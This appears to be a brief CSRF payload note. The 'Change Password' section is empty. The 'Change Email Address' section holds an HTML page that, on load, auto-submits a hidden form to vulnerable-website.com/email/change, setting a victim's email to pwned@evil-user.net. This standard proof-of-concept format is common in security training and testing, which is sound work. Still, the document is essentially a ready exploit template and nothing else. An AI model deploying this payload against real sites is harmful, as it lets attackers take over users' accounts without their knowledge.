### Change Password

```html

```

### Change Email Address
```html
<html> 
	<body>
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>	
</html>
```
